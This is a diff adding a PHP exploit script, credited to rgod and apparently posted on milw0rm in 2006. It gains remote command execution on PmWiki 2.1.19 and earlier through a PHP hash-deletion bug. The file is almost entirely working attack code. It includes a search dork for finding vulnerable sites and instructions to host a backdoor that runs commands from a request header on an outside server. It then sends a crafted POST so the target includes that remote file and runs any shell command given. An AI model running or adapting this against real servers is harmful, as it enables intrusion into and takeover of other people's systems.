@@ -1,0 +1,151 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+print_r('
+--------------------------------------------------------------------------------
+PmWiki <= 2.1.19 Zend_Hash_Del_Key_Or_Index/remote commands execution exploit
+by rgod rgod@autistici.org
+site: http://retrogod.altervista.org
+dork: inurl:pmwiki.php +"Page last modified on" | PmWikiPhilosophy
+--------------------------------------------------------------------------------
+');
+/*
+works with register_globals=On
+against PHP < 4.4.3, 5 <= PHP < 5.1.4
+*/
+if ($argc<5) {
+print_r('
+--------------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path http_loc cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to pmwiki
+http_loc:  an http site with the code to include (without ending slash)
+cmd:       a shell command
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' localhost /pmwiki/ http://somehost.com ls -la -P1.1.1.1:80
+php '.$argv[0].' localhost /pmwiki/ http://somehost.com ls -la -p81
+
+Note:
+prepare this code in http://somehost.com/scripts/stdconfig.php/index.html :
+<?php
+error_reporting(0);set_time_limit(0);echo "my_delim";
+passthru($_SERVER["HTTP_CLIENT_IP"]);die;
+?>
+--------------------------------------------------------------------------------
+');
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+   $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+   }
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$http_loc=$argv[3];
+$cmd="";
+$port=80;
+$proxy="";
+
+for ($i=4; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$data ="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"FarmD\";\r\n\r\n";
+$data.="$http_loc\r\n";
+$data.="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"-1778478215\";\r\n\r\n";
+$data.="1\r\n";
+$data.="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"-1304181425\";\r\n\r\n";
+$data.="1\r\n";
+$data.="-----------------------------7d529a1d23092a--\r\n";
+$packet ="POST ".$p."pmwiki.php?n=PmWiki.BasicEditing?action=edit HTTP/1.0\r\n";
+$packet.="CLIENT-IP: ".$cmd."\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (strstr($html,"my_delim")){
+echo "exploit succeeded...\n";$temp=explode("my_delim",$html);die($temp[1]);
+}
+elseif (strstr($html,"failed to open stream"))
+{echo "*** adjust path... ***\n";die($html);}
+else
+{echo "exploit failed...";}
+?>
+
+# milw0rm.com [2006-09-03]
